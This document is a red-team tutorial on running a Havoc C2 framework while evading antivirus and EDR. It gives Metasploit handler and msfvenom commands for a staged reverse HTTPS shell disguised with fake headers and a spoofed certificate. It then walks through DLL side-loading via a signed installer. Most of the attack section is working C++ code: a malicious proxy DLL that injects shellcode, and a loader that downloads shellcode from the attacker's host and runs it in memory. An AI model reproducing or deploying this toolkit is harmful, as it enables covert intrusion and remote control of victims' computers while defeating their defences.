# Havoc C2 with AV/EDR Bypass Methods in 2024
================

## Description
In 2024, we will need to customize our exploit chain to bypass AV/EDR/IDS. Specifically, we need to ensure our shellcode is less likely to trigger signature and dynamic analysis-based detection on the host, as well as make our network traffic appear more normal.

To achieve this, we will:

Encrypt the first and second stage payload connections via HTTPS using a validated/non-default SSL certificate.

Add custom headers, user-agents, certificates, URIs, jitter, and ROP chains in our stage one and stage two listeners/payloads to make it harder for Blue Teamers and AV/EDR to detect our C2 connection.

By following these methods, we can enhance our ability to bypass AV/EDR/IDS and maintain the integrity of our C2 operations.



A brief description of the project and its purpose.

## Chapter 1: Setting Up Havoc C2 and Stages of Payload
### 1.1 Setting Up Havoc C2
![setting-up](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A828%2Fformat%3Awebp%2F1*QdNLWBL9Fjd9WhQJq7KJoA.png&width=768&dpr=4&quality=100&sign=9364f61c&sv=1)
Run the client and connect it to the Team Server using credentials found in ./profiles/havoc.yaotl
![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A828%2Fformat%3Awebp%2F1*ROeGEesh5jf8W0Ho_QTVcg.png&width=400&dpr=2&quality=100&sign=c7952252&sv=1)
A graphical user interface (GUI) will appear, allowing us to manage listeners and payloads.
![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A828%2Fformat%3Awebp%2F1*Y8D9_X6qcz0PsQ5Z1In_ag.png&width=400&dpr=2&quality=100&sign=ba8eb418&sv=1)


#### Setting Up a Havoc C2 Listener
* Navigate to View > Listeners to configure the listener that the victim will connect to during execution of the stage 2 payload.

* Utilize a random user agent generated above to enhance stealth.
![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A720%2Fformat%3Awebp%2F1*36dvULOxixFZBkFJ3uFTRg.png&width=400&dpr=2&quality=100&sign=37ba534a&sv=1)


### 1.2 Creating the Stage 2 Shellcode

![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A720%2Fformat%3Awebp%2F1*65pviat2yIw5UKgfqC_-DA.png&width=768&dpr=4&quality=100&sign=dfcb7b39&sv=1)
* Create the second stage shellcode, which will be delivered to the victim after initial connection.

* Ensure the stage 2 shellcode is larger to minimize disk footprint.

* Click generate and we see the payload saved as demon.x64.bin.

#### Stage 2 Payload Customization Details
* Indirect Syscalls: Syscalls executed within ntdll.dll memory space mimic legitimate operations, evading EDR detection.

* Stack Duplication: During sleep phases, duplicate stacks to avoid detection.

* Foliage Technique: Utilize NtApcQueueThread to queue a ROP chain for sleep obfuscation.

* RtlCreateTimer: Queue ROP chain between sleep cycles.

### 1.3 Creating the Stage 1 Shellcode
We need to create our first stage payload which is the only shellcode that will be inside of our malicious DLL loader (on disk) on the victim. We first want to generate a SSL certificate that will not be fingerprinted as being from msfvenom. This is extremely important or your meterpreter connection will be detected.

![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A828%2Fformat%3Awebp%2F1*lxPR4yjg4XrEOWsMMMgt1g.png&width=400&dpr=2&quality=100&sign=9a28e21d&sv=1)
* Generate an SSL certificate to prevent detection as a standard MSFVenom fingerprint.

* This shellcode creates a reverse shell connection to our attacker machine to transfer the Stage 2 payload (demon.x64.bin) we just generated. 

#### Creating listener using msfconsole
Now we need to create a listener using msfconsole to handle the reverse shell code we just created. We make sure to enter the SHELLCODE_FILE as our Havoc C2 binary file we generated previously (demon.x64.bin) so we can send our Stage 2 payload after initial connection over meterpreter HTTPS. Here’s the options:

* use **multi/handler**

* set **payload windows/x64/custom/reverse_https**

* set **exitfunc thread**

* set **lhost <IP ADDR>**

* set **lport 8443**

* set **luri blog.html**

* set **HttpServerName Blogger**

* set **shellcode_file demon.x64.bin**

* set **exitonsession false**

* set **HttpHostHeader www.factbook.com**

* set **HandlerSSLCert www.google.com.pem**

```bash
msfvenom -p windows/x64/custom/reverse_https LHOST=10.0.2.9 LPORT=8443 EXITFUNC=thread -f raw HttpUserAgent='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' LURI=blog.html HandlerSSLCert=/home/atler/Downloads/www.google.com.pem
```

![Image Description](https://ayushadarsh.gitbook.io/~gitbook/image?url=https%3A%2F%2Fmiro.medium.com%2Fv2%2Fresize%3Afit%3A828%2Fformat%3Awebp%2F1*hVVAsx9vnrxHVVTrqDj4iw.png&width=400&dpr=2&quality=100&sign=a363570b&sv=1)

#### Connection Process:

* **Step1>**  The victim executes the stage 1 payload stored on disk. This triggers the download of the stage 2 payload from port 8443 on the attacker's machine using Metasploit.

* **Step 2>** Once downloaded, the stage 2 payload establishes a connection from the victim's machine, establishing a Command and Control (C2) channel to port 443 on the attacker's system.

## Chapter 2: Executing C2 Connection via DLL Proxy Hijacking + Side-Loading
In this chapter, we will explore how to stealthily execute a Command and Control (C2) connection using DLL Proxy Hijacking and Side-Loading techniques. We'll detail each step of the process, from determining which Portable Executable (PE) to use, to creating and executing a malicious DLL.
### Steps to Execute C2 Connection via DLL Proxy Hijacking and Side-Loading
#### 1. Determine a Vulnerable PE
* **Objective:** Identify a signed/trusted PE that allows DLL side-loading.

* **Example PE:** Sumatra PDF setup executable.

* [**Download Link ** ](https://www.sumatrapdfreader.org/download-free-pdf-viewer?source=post_page-----733d423fc67b--------------------------------)
  
#### 2. Identify the DLL Name and Export Definitions
* **Objective:** Ensure that the malicious DLL does not break the PE.

* **Tools:** Sparticus and procmon from sysinternals.

* **Command to Run Sparticus:**
```bash
.\Spartacus.exe --mode dll --procmon .\Procmon.exe --pml C:\Data\logs.pml --csv C:\Data\VulnerableDLLFiles.csv --solution C:\Data\Solutions --verbose
```
* **DLL Chosen for Hijacking:** DWrite.dll

* **Generate cpp Template:** Sparticus outputs a C++ template with export definitions.

#### 3. Create and Build Malicious DLL
* **File:** dllmain.cpp
* **Pragma Comments and Includes:**
```cpp
#pragma once
#pragma comment(linker, "/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")
#include <windows.h>
#include <ios>
#include <fstream>
```
* **Payload Function:**
```cpp
VOID Payload() {
    unsigned char shellcode[] = {
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        // Rest of the shellcode here
    };

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode, NULL));
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            Payload();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
* **Build in Visual Studio:** Load the template, add the shellcode, and build the DLL.
#### 4. Validate and Test the Malicious DLL
* **Disable Defender:** Test the DLL with Defender turned off.

* **Verify DLL Loading:**

   *Check procmon to ensure the custom DLL loads first.

   *Confirm the original DLL (DWrite.dll) loads afterward.
#### 5. Avoid Detection by Not Hardcoding Shellcode
* **Problem:** Defender detects hardcoded meterpreter shellcode.

* **Solution:** Load shellcode remotely from a server.

* **Code to Load Shellcode Remotely:**
```cpp
#pragma once
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <ios>
#include <fstream>

char ip[] = "10.0.2.9";
char port[] = "80";
char resource[] = "iloveblogs.bin";

#pragma comment(lib, "ntdll")
#pragma comment(linker, "/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define NtCurrentProcess() ((HANDLE)-1)
#define DEFAULT_BUFLEN 4096

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS NtWaitForSingleObject(
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Timeout
);

void getShellcode_Run(char* host, char* port, char* resource) {
    DWORD oldp = 0;
    BOOL returnValue;
    size_t origsize = strlen(host) + 1;
    const size_t newsize = 100;
    size_t convertedChars = 0;
    wchar_t Whost[newsize];
    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    char sendbuf[MAX_PATH] = "";
    lstrcatA(sendbuf, "GET /");
    lstrcatA(sendbuf, resource);
    char recvbuf[DEFAULT_BUFLEN];
    memset(recvbuf, 0, DEFAULT_BUFLEN);
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult!= 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(host, port, &hints, &result);
    if (iResult!= 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return;
    }

    for (ptr = result; ptr!= NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return;
        }

        printf("[+] Connect to %s:%s", host, port);
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return;
    }

    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    printf("\n[+] Sent %ld Bytes\n", iResult);

    iResult = shutdown(ConnectSocket, SD_SEND);
       if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    do {
        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        if (iResult > 0)
            printf("[+] Received %d Bytes\n", iResult);
        else if (iResult == 0)
            printf("[+] Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

        HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
        PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);
        HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        WaitForSingleObject(remoteThread, INFINITE);
        CloseHandle(remoteThread);
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
    } while (iResult > 0);

    closesocket(ConnectSocket);
    WSACleanup();
}

int main() {
    getShellcode_Run(ip, port, resource);
    return 0;
}
```
